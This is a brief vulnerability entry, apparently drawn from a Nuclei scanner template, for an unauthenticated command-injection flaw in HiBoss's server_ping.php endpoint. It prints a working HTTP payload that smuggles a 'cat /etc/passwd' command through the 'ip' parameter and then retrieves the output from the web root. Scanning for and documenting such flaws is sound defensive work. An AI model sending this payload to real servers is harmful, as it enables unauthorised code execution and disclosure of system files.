# Vulnerability: Hiboss - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`hiboss-rce.yaml`)

## Description
HiBoss allows remote unauthenticated attackers to cause the server to execute arbitrary code via the 'server_ping.php' endpoint and the 'ip' parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../{{randstr}}.txt&id=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

GET /{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}
```

